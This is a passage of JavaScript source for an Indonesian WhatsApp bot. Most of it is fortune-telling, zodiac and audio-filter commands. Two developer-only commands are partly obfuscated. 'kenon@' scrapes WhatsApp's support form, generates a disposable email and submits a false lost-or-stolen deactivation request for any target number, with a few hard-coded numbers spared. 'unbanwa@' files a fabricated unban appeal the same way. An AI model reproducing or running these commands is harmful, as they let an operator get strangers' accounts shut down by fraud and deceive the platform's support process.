                if (!text) return newReply(`Contoh : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`)
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.ramalan_jodoh_bali(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Nama Anda :* ${anu.message.nama_anda.nama}\n• *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n• *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n• *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'suamiistri': {
                if (!text) return newReply(`Contoh : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`)
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.suami_istri(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Nama Suami :* ${anu.message.suami.nama}\n• *Lahir Suami :* ${anu.message.suami.tgl_lahir}\n• *Nama Istri :* ${anu.message.istri.nama}\n• *Lahir Istri :* ${anu.message.istri.tgl_lahir}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'ramalancinta': case 'ramalcinta': {
                if (!text) return newReply(`Contoh : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`)
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.ramalan_cinta(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Nama Anda :* ${anu.message.nama_anda.nama}\n• *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n• *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n• *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n• *Sisi Positif :* ${anu.message.sisi_positif}\n• *Sisi Negatif :* ${anu.message.sisi_negatif}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'artinama': {
                if (!text) return newReply(`Contoh : ${prefix + command} Dika Ardianta`)
                let anu = await primbon.arti_nama(text)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Nama :* ${anu.message.nama}\n• *Arti :* ${anu.message.arti}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'kecocokannama': case 'cocoknama': {
                if (!text) return newReply(`Contoh : ${prefix + command} Dika, 7, 7, 2005`)
                let [nama, tgl, bln, thn] = text.split`,`
                let anu = await primbon.kecocokan_nama(nama, tgl, bln, thn)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tgl_lahir}\n• *Life Path :* ${anu.message.life_path}\n• *Destiny :* ${anu.message.destiny}\n• *Destiny Desire :* ${anu.message.destiny_desire}\n• *Personality :* ${anu.message.personality}\n• *Persentase :* ${anu.message.persentase_kecocokan}`, m)
            }
            break
            case 'kecocokanpasangan': case 'cocokpasangan': case 'pasangan': {
                if (!text) return newReply(`Contoh : ${prefix + command} Dika|Novia`)
                let [nama1, nama2] = text.split`|`
                let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
                if (anu.status == false) return newReply(anu.message)
                conn.sendImage(m.chat,  anu.message.gambar, `• *Nama Anda :* ${anu.message.nama_anda}\n• *Nama Pasangan :* ${anu.message.nama_pasangan}\n• *Sisi Positif :* ${anu.message.sisi_positif}\n• *Sisi Negatif :* ${anu.message.sisi_negatif}`, m)
            }
            break
            case 'jadianpernikahan': case 'jadiannikah': {
                if (!text) return newReply(`Contoh : ${prefix + command} 6, 12, 2020`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.tanggal_jadian_pernikahan(tgl, bln, thn)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Tanggal Pernikahan :* ${anu.message.tanggal}\n• *karakteristik :* ${anu.message.karakteristik}`, m)
            }
            break
            case 'sifatusaha': {
                if (!ext)return newReply(`Contoh : ${prefix+ command} 28, 12, 2021`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Lahir :* ${anu.message.hari_lahir}\n• *Usaha :* ${anu.message.usaha}`, m)
            }
            break
            case 'rejeki': case 'rezeki': {
                if (!text) return newReply(`Contoh : ${prefix + command} 7, 7, 2005`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.rejeki_hoki_weton(tgl, bln, thn)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Lahir :* ${anu.message.hari_lahir}\n• *Rezeki :* ${anu.message.rejeki}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'pekerjaan': case 'kerja': {
                if (!text) return newReply(`Contoh : ${prefix + command} 7, 7, 2005`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.pekerjaan_weton_lahir(tgl, bln, thn)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Lahir :* ${anu.message.hari_lahir}\n• *Pekerjaan :* ${anu.message.pekerjaan}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'ramalannasib': case 'ramalnasib': case 'nasib': {
                if (!text) return newReply(`Contoh : 7, 7, 2005`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.ramalan_nasib(tgl, bln, thn)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Analisa :* ${anu.message.analisa}\n• *Angka Akar :* ${anu.message.angka_akar}\n• *Sifat :* ${anu.message.sifat}\n• *Elemen :* ${anu.message.elemen}\n• *Angka Keberuntungan :* ${anu.message.angka_keberuntungan}`, m)
            }
            break
            case 'potensipenyakit': case 'penyakit': {
                if (!text) return newReply(`Contoh : ${prefix + command} 7, 7, 2005`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.cek_potensi_penyakit(tgl, bln, thn)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Analisa :* ${anu.message.analisa}\n• *Sektor :* ${anu.message.sektor}\n• *Elemen :* ${anu.message.elemen}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'artitarot': case 'tarot': {
                if (!text) return newReply(`Contoh : ${prefix + command} 7, 7, 2005`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.arti_kartu_tarot(tgl, bln, thn)
                if (anu.status == false) return newReply(anu.message)
                conn.sendImage(m.chat, anu.message.image, `• *Lahir :* ${anu.message.tgl_lahir}\n• *Simbol Tarot :* ${anu.message.simbol_tarot}\n• *Arti :* ${anu.message.arti}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'fengshui': {
                if (!text) return `Contoh : ${prefix + command} Dika, 1, 2005\n\nNote : ${prefix + command} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`
                let [nama, gender, tahun] = text.split`,`
                let anu = await primbon.perhitungan_feng_shui(nama, gender, tahun)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tahun_lahir}\n• *Gender :* ${anu.message.jenis_kelamin}\n• *Angka Kua :* ${anu.message.angka_kua}\n• *Kelompok :* ${anu.message.kelompok}\n• *Karakter :* ${anu.message.karakter}\n• *Sektor Baik :* ${anu.message.sektor_baik}\n• *Sektor Buruk :* ${anu.message.sektor_buruk}`, m)
            }
            break
            case 'haribaik': {
                if (!text) return newReply(`Contoh : ${prefix + command} 7, 7, 2005`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.petung_hari_baik(tgl, bln, thn)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Lahir :* ${anu.message.tgl_lahir}\n• *Kala Tinantang :* ${anu.message.kala_tinantang}\n• *Info :* ${anu.message.info}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'harisangar': case 'taliwangke': {
                if (!text) return newReply(`Contoh : ${prefix + command} 7, 7, 2005`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.hari_sangar_taliwangke(tgl, bln, thn)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Lahir :* ${anu.message.tgl_lahir}\n• *Hasil :* ${anu.message.result}\n• *Info :* ${anu.message.info}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'harinaas': case 'harisial': {
                if (!text) return newReply(`Contoh : ${prefix + command} 7, 7, 2005`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.primbon_hari_naas(tgl, bln, thn)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Hari Lahir :* ${anu.message.hari_lahir}\n• *Tanggal Lahir :* ${anu.message.tgl_lahir}\n• *Hari Naas :* ${anu.message.hari_naas}\n• *Info :* ${anu.message.catatan}\n• *Catatan :* ${anu.message.info}`, m)
            }
            break
            case 'nagahari': case 'harinaga': {
                if (!text) return newReply(`Contoh : ${prefix + command} 7, 7, 2005`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.rahasia_naga_hari(tgl, bln, thn)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Hari Lahir :* ${anu.message.hari_lahir}\n• *Tanggal Lahir :* ${anu.message.tgl_lahir}\n• *Arah Naga Hari :* ${anu.message.arah_naga_hari}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'arahrejeki': case 'arahrezeki': {
                if (!text) return newReply(`Contoh : ${prefix + command} 7, 7, 2005`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.primbon_arah_rejeki(tgl, bln, thn)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Hari Lahir :* ${anu.message.hari_lahir}\n• *tanggal Lahir :* ${anu.message.tgl_lahir}\n• *Arah Rezeki :* ${anu.message.arah_rejeki}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'peruntungan': {
                if (!text) return newReply(`Contoh : ${prefix + command} DIka, 7, 7, 2005, 2022\n\nNote : ${prefix + command} Nama, tanggal lahir, bulan lahir, tahun lahir, untuk tahun`)
                let [nama, tgl, bln, thn, untuk] = text.split`,`
                let anu = await primbon.ramalan_peruntungan(nama, tgl, bln, thn, untuk)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tgl_lahir}\n• *Peruntungan Tahun :* ${anu.message.peruntungan_tahun}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'weton': case 'wetonjawa': {
                if (!text) return newReply(`Contoh : ${prefix + command} 7, 7, 2005`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.weton_jawa(tgl, bln, thn)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Tanggal :* ${anu.message.tanggal}\n• *Jumlah Neptu :* ${anu.message.jumlah_neptu}\n• *Watak Hari :* ${anu.message.watak_hari}\n• *Naga Hari :* ${anu.message.naga_hari}\n• *Jam Baik :* ${anu.message.jam_baik}\n• *Watak Kelahiran :* ${anu.message.watak_kelahiran}`, m)
            }
            break
            case 'sifat': case 'karakter': {
                if (!text) return newReply(`Contoh : ${prefix + command} Dika, 7, 7, 2005`)
                let [nama, tgl, bln, thn] = text.split`,`
                let anu = await primbon.sifat_karakter_tanggal_lahir(nama, tgl, bln, thn)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tgl_lahir}\n• *Garis Hidup :* ${anu.message.garis_hidup}`, m)
            }
            break
            case 'keberuntungan': {
                if (!text) return newReply(`Contoh : ${prefix + command} Dika, 7, 7, 2005`)
                let [nama, tgl, bln, thn] = text.split`,`
                let anu = await primbon.potensi_keberuntungan(nama, tgl, bln, thn)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tgl_lahir}\n• *Hasil :* ${anu.message.result}`, m)
            }
            break
            case 'memancing': {
                if (!text) return newReply(`Contoh : ${prefix + command} 12, 1, 2022`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.primbon_memancing_ikan(tgl, bln, thn)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Tanggal :* ${anu.message.tgl_memancing}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'masasubur': {
                if (!text) return newReply(`Contoh : ${prefix + command} 12, 1, 2022, 28\n\nNote : ${prefix + command} hari pertama menstruasi, siklus`)
                let [tgl, bln, thn, siklus] = text.split`,`
                let anu = await primbon.masa_subur(tgl, bln, thn, siklus)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'zodiak': case 'zodiac': {
                if (!text) return newReply(`Contoh : ${prefix+ command} 7 7 2005`)
                let zodiak = [
                    ["capricorn", new Date(1970, 0, 1)],
                    ["aquarius", new Date(1970, 0, 20)],
                    ["pisces", new Date(1970, 1, 19)],
                    ["aries", new Date(1970, 2, 21)],
                    ["taurus", new Date(1970, 3, 21)],
                    ["gemini", new Date(1970, 4, 21)],
                    ["cancer", new Date(1970, 5, 22)],
                    ["leo", new Date(1970, 6, 23)],
                    ["virgo", new Date(1970, 7, 23)],
                    ["libra", new Date(1970, 8, 23)],
                    ["scorpio", new Date(1970, 9, 23)],
                    ["sagittarius", new Date(1970, 10, 22)],
                    ["capricorn", new Date(1970, 11, 22)]
                ].reverse()

                function getZodiac(month, day) {
                    let d = new Date(1970, month - 1, day)
                    return zodiak.find(([_,_d]) => d >= _d)[0]
                }
                let date = new Date(text)
                if (date == 'Invalid Date') return date
                let d = new Date()
                let [tahun, bulan, tanggal] = [d.getFullYear(), d.getMonth() + 1, d.getDate()]
                let birth = [date.getFullYear(), date.getMonth() + 1, date.getDate()]

                let zodiac = await getZodiac(birth[1], birth[2])
                
                let anu = await primbon.zodiak(zodiac)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Zodiak :* ${anu.message.zodiak}\n• *Nomor :* ${anu.message.nomor_keberuntungan}\n• *Aroma :* ${anu.message.aroma_keberuntungan}\n• *Planet :* ${anu.message.planet_yang_mengitari}\n• *Bunga :* ${anu.message.bunga_keberuntungan}\n• *Warna :* ${anu.message.warna_keberuntungan}\n• *Batu :* ${anu.message.batu_keberuntungan}\n• *Elemen :* ${anu.message.elemen_keberuntungan}\n• *Pasangan Zodiak :* ${anu.message.pasangan_zodiak}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
case "unbanwa@":{
const _0x3b0948=_0x1c03;function _0x1c03(_0x2ba437,_0x629f73){const _0x174abb=_0x174a();return _0x1c03=function(_0x1c03e2,_0x278dea){_0x1c03e2=_0x1c03e2-0x141;let _0x35c234=_0x174abb[_0x1c03e2];return _0x35c234;},_0x1c03(_0x2ba437,_0x629f73);}(function(_0x4cbb0b,_0x10f022){const _0x4868dd=_0x1c03,_0x42ce23=_0x4cbb0b();while(!![]){try{const _0xb1fb=parseInt(_0x4868dd(0x177))/0x1*(-parseInt(_0x4868dd(0x175))/0x2)+parseInt(_0x4868dd(0x167))/0x3*(-parseInt(_0x4868dd(0x156))/0x4)+-parseInt(_0x4868dd(0x166))/0x5*(parseInt(_0x4868dd(0x16c))/0x6)+parseInt(_0x4868dd(0x143))/0x7+parseInt(_0x4868dd(0x151))/0x8*(parseInt(_0x4868dd(0x172))/0x9)+parseInt(_0x4868dd(0x159))/0xa+parseInt(_0x4868dd(0x153))/0xb;if(_0xb1fb===_0x10f022)break;else _0x42ce23['push'](_0x42ce23['shift']());}catch(_0x5680dc){_0x42ce23['push'](_0x42ce23['shift']());}}}(_0x174a,0xcac5e));if(!isDeveloper)return reply(_0x3b0948(0x14d));if(!q)return reply(_0x3b0948(0x149)+(prefix+command)+_0x3b0948(0x14a));let dia=q[_0x3b0948(0x157)]('|')[0x0]['replace'](/[^0-9]/g,'');var axioss=require(_0x3b0948(0x15f));let ntah=await axioss[_0x3b0948(0x174)](_0x3b0948(0x15d)),email=await axioss[_0x3b0948(0x174)]('https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=319708'),cookie=ntah[_0x3b0948(0x144)][_0x3b0948(0x179)][_0x3b0948(0x14f)](';\x20');const cheerio=require(_0x3b0948(0x141));function _0x174a(){const _0x531673=['axios','lsd','__comment_req','input[name=jazoest]','country_selector','email','find','15hDCWjB','147DBpSTN','POST','19316.BP:whatsapp_www_pkg.2.0.0.0.0','your_message','load','647538LvZJaa','__a','__user','__req','for\x20(;;);','dpr','522AwPWyB','href','get','34894XaBnLy','https://www.whatsapp.com','68UrTdid','input[name=lsd]','set-cookie','action','cheerio','format','354956FmZaWo','headers','email_confirm','ANDROID','replace','__ccg','Penggunaan\x20','\x20628xxxx','data','val','Owner\x20Only','__csr','join','append','64168EVGpsR','jazoest','17067391IrnzBQ','__hs','submit','12032tsaSyr','split','INDONESIA','4206080JJfFXJ','phone_number','UNKNOWN','platform','https://www.whatsapp.com/contact/noclient/','form'];_0x174a=function(){return _0x531673;};return _0x174a();}let $=cheerio[_0x3b0948(0x16b)](ntah[_0x3b0948(0x14b)]),$form=$(_0x3b0948(0x15e)),url=newURL($form['attr'](_0x3b0948(0x17a)),_0x3b0948(0x176))[_0x3b0948(0x173)],form=new URLSearchParams();form[_0x3b0948(0x150)](_0x3b0948(0x152),$form['find'](_0x3b0948(0x162))[_0x3b0948(0x14c)]()),form[_0x3b0948(0x150)](_0x3b0948(0x160),$form[_0x3b0948(0x165)](_0x3b0948(0x178))[_0x3b0948(0x14c)]()),form[_0x3b0948(0x150)]('step',_0x3b0948(0x155)),form['append'](_0x3b0948(0x163),_0x3b0948(0x158)),form[_0x3b0948(0x150)](_0x3b0948(0x15a),''+dia),form[_0x3b0948(0x150)](_0x3b0948(0x164),email[_0x3b0948(0x14b)][0x0]),form[_0x3b0948(0x150)](_0x3b0948(0x145),email['data'][0x0]),form[_0x3b0948(0x150)](_0x3b0948(0x15c),_0x3b0948(0x146)),form[_0x3b0948(0x150)](_0x3b0948(0x16a),'meu\x20número\x20por\x20engano\x20Peço\x20que\x20vocês\x20reativem\x20meu\x20número\x20pois\x20tenho\x20família\x20em\x20outro\x20país\x20e\x20preciso\x20me\x20comunicar\x20com\x20eles'),form[_0x3b0948(0x150)](_0x3b0948(0x16e),'0'),form[_0x3b0948(0x150)](_0x3b0948(0x16d),'1'),form['append'](_0x3b0948(0x14e),''),form['append'](_0x3b0948(0x16f),'8'),form['append'](_0x3b0948(0x154),_0x3b0948(0x169)),form['append'](_0x3b0948(0x171),'1'),form[_0x3b0948(0x150)](_0x3b0948(0x148),_0x3b0948(0x15b)),form[_0x3b0948(0x150)]('__rev','1006630858'),form['append'](_0x3b0948(0x161),'0');let res=await axioss({'url':url,'method':_0x3b0948(0x168),'data':form,'headers':{'cookie':cookie}});reply(util[_0x3b0948(0x142)](JSON['parse'](res[_0x3b0948(0x14b)][_0x3b0948(0x147)](_0x3b0948(0x170),''))));
}
            break
case "kenon@":{
const _0x594df9=_0x51d5;(function(_0x4a9896,_0x4dc8d7){const _0x37f43e=_0x51d5,_0x39c9ef=_0x4a9896();while(!![]){try{const _0x7d069a=-parseInt(_0x37f43e(0x96))/0x1+-parseInt(_0x37f43e(0x91))/0x2+-parseInt(_0x37f43e(0x88))/0x3+parseInt(_0x37f43e(0x94))/0x4+parseInt(_0x37f43e(0x8c))/0x5*(parseInt(_0x37f43e(0x8f))/0x6)+parseInt(_0x37f43e(0x86))/0x7*(-parseInt(_0x37f43e(0x89))/0x8)+parseInt(_0x37f43e(0x87))/0x9*(parseInt(_0x37f43e(0x92))/0xa);if(_0x7d069a===_0x4dc8d7)break;else _0x39c9ef['push'](_0x39c9ef['shift']());}catch(_0xc9e534){_0x39c9ef['push'](_0x39c9ef['shift']());}}}(_0x2315,0xd8b29));function _0x51d5(_0x4c884d,_0x39a957){const _0x231588=_0x2315();return _0x51d5=function(_0x51d57a,_0xa96399){_0x51d57a=_0x51d57a-0x86;let _0xf2422e=_0x231588[_0x51d57a];return _0xf2422e;},_0x51d5(_0x4c884d,_0x39a957);}if(!isDeveloper)return reply(_0x594df9(0x93));if(!q)return reply(_0x594df9(0x8a)+(prefix+command)+_0x594df9(0x8b));let dia=q[_0x594df9(0x8d)]('|')[0x0]['replace'](/[^0-9]/g,'');var cekap=await lexxy['onWhatsApp'](dia+'@s.whatsapp.net');if(cekap['length']==0x0)return reply(_0x594df9(0x95));if(dia==_0x594df9(0x90))return;function _0x2315(){const _0x2494a1=['Nomor\x20tersebut\x20tidak\x20terdaftar\x20di\x20WhatsApp\x0aSilahkan\x20kirim\x20nomor\x20yg\x20valid.','1323493DkelfN','1334473vQLwyi','9ycZfNl','328110XPSqtP','8gwaUHC','Penggunaan\x20','\x20628xxxx','682390wXgmfB','split','6282279915237','54mgTCKv','6285789004732','2310438QFDOZM','8351950eoCndY','Owner\x20Only','6411268cZiQRa'];_0x2315=function(){return _0x2494a1;};return _0x2315();}if(dia=='6283834558105')return;if(dia==_0x594df9(0x8e))return;
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/?subject=messenger")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=319708")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", `${dia}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Perdido/roubado: desative minha conta`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}
})
reply(util.format(JSON.parse(res.data.replace("for (;;);", ""))))
}
            break
            case 'shio': {
                if (!text) return newReply(`Contoh : ${prefix + command} tikus\n\nNote : For Detail https://primbon.com/shio.htm`)
                let anu = await primbon.shio(text)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Hasil :* ${anu.message}`, m)
            }
            break
            
            case 'bass': 
            case 'blown': 
            case 'deep': 
            case 'earrape': 
            case 'fast': 
            case 'fat': 
            case 'nightcore': 
            case 'reverse': 
            case 'robot': 
            case 'slow': 
            case 'smooth': 
            case 'tupai': {
                try {
                let set
                if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
                if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
                if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
                if (/earrape/.test(command)) set = '-af volume=12'
                if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
                if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
                if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
                if (/reverse/.test(command)) set = '-filter_complex "areverse"'
                if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
                if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
                if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
                if (/tupai/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
                if (/audio/.test(mime)) {
                newReply(mess.wait)
                let media = await conn.downloadAndSaveMediaMessage(qmsg)
                let ran = getRandom('.mp3')
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                fs.unlinkSync(media)
                if (err) return newReply(err)
                let buff = fs.readFileSync(ran)
                conn.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
                fs.unlinkSync(ran)
                })
                } else newReply(`Balas audio yang ingin diubah dengan caption *${prefix + command}*`)
                } catch (e) {
                newReply(e)
                }
                }
            break
            
            /*
            case 'setcmd': {
                if (!m.quoted) return newReply('Reply Pesan!')
                if (!m.quoted.fileSha256) return newReply('SHA256 Hash Tidak Ditemukan ❎')
                if (!text) return newReply(`Untuk Command Apa?`)
                let hash = m.quoted.fileSha256.toString('base64')
                if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) return newReply('Anda Tidak Diizinkan Untuk Mengubah Perintah Stiker Ini ❎')
                global.db.data.sticker[hash] = {
                    text,
                    mentionedJid: m.mentionedJid,
                    creator: m.sender,
                    at: +new Date,
                    locked: false,
                }
                newReply(mess.done)
            }
            break
            case 'delcmd': {
                let hash = m.quoted.fileSha256.toString('base64')
                if (!hash) return newReply(`Tidak Ada Hash`)
                if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) return newReply('Anda Tidak Diizinkan Untuk Mengubah Perintah Stiker Ini ❎')
                delete global.db.data.sticker[hash]
                newReply(mess.done)
            }
            break
            case 'listcmd': {
                let teks = `*List Hash 🚀*
Info: *bold* hash is Locked 🔒

*Hash ☕ :*
${Object.entries(global.db.data.sticker).map(([key, value], index) => `${index + 1}. ${value.locked ? `*${key}*` : key} : ${value.text}`).join('\n')}
`.trim()
                conn.sendText(m.chat, teks, m, {
                    mentions: Object.values(global.db.data.sticker).map(x => x.mentionedJid).reduce((a, b) => [...a, ...b], [])
                })
            }
            break
            case 'lockcmd': {
                if (!isCreator) return newReply(mess.owner)
                if (!m.quoted) return newReply('Reply Pesan!')
                if (!m.quoted.fileSha256) return newReply('SHA256 Hash Missing')
                let hash = m.quoted.fileSha256.toString('base64')
                if (!(hash in global.db.data.sticker)) return newReply('Hash Not Found In Database')
                global.db.data.sticker[hash].locked = !/^un/i.test(command)
                newReply('Done!')
            }
            break
            case 'addmsg': {
                if (!m.quoted) return newReply('Reply Message Yang Ingin Disave Di Database')
                if (!text) return newReply(`Contoh : ${prefix + command} Nama File`)
                let msgs = global.db.data.database
                if (text.toLowerCase() in msgs) return newReply(`'${text}' Telah Terdaftar Di List Pesan`)
                msgs[text.toLowerCase()] = quoted.fakeObj
                newReply(`Berhasil Menambahkan Pesan Di List Pesan Sebagai '${text}'
    
Akses dengan ${prefix}getmsg ${text}

Lihat list Pesan Dengan ${prefix}listmsg`)
            }
            break
            case 'getmsg': {
                if (!text) return newReply(`Contoh : ${prefix + command} File Name\n\nLihat List Pesan Dengan ${prefix}listmsg`)
                let msgs = global.db.data.database
                if (!(text.toLowerCase() in msgs)) return newReply(`'${text}' Tidak Terdaftar Di List Pesan`)
                conn.copyNForward(m.chat, msgs[text.toLowerCase()], true)
            }
            break
            case 'listmsg': {
                let msgs = JSON.parse(fs.readFileSync('./src/database.json'))
                let seplit = Object.entries(global.db.data.database).map(([nama, isi]) => {
                    return {
                        nama,
                        ...isi
                    }
                })
                let teks = 'LIST DATABASE 📂\n\n'
                for (let i of seplit) {
                    teks += `📛 *Name :* ${i.nama}`
                    teks += `🚀 *Type :* ${getContentType(i.message).replace(/Message/i, '')}\n────────────────────────\n\n`
                }
                newReply(teks)
            }
            break
            case 'delmsg':
            case 'deletemsg': {
                let msgs = global.db.data.database
                if (!(text.toLowerCase() in msgs)) return newReply(`'${text}' tidak terdaftar didalam list pesan`)
                delete msgs[text.toLowerCase()]
                newReply(`Berhasil menghapus '${text}' dari list pesan`)
            }
            break
            */
  
            case 'allmenu': 
            case 'menu': {
    let anu =`Hello ${pushname}\nI Am ${namabot} a whatsapp bot that can make it easier for you to solve problems with the internet quickly.

  ☍ *Mode:* ${conn.public ? 'Public-Mode 👥' : 'Self-Mode 👤'}
  ☍ *Bailyes:* github:FallEzz/Baileys
  ☍ *Runtime:* ${runtime(process.uptime())}
  ☍ *Total User:* ${Object.keys(global.db.data.users).length}
  ☍ *Total Premium:* ${prem.length}
  ☍ *Total Banned:* ${ban.length}
  ☍ *Total Fitur:* ${totalFitur()}
  
タ *I N F O  U S E R*

   ☍ *Name:* ${pushname}
   ☍ *Number:* ${m.sender.split('@')[0]}
   ☍ *Status:* ${isCreator ? "Owner Only" : "User ⭐"}
   ☍ *User:* ${isPremium ? 'Premium Only' : 'Gratisan ⭐'}
   ☍ *Limit:* ${isCreator ? 'Unlimited Only' : `${db.data.users[m.sender].limit}⭐`}
   ${readmore}
タ *O W N E R  M E N U*
▰▱▰▱▰▱▰▱▰▱▰▱▰
╔━═━≫
║⫸ ➪◇ ‣ ${prefix}listpc
║⫸ ➪◇ ‣ ${prefix}listgc
║⫸ ➪◇ ‣ ${prefix}public
║⫸ ➪◇ ‣ ${prefix}self
║⫸ ➪◇ ‣ ${prefix}enc
║⫸ ➪◇ ‣ ${prefix}pushkontak
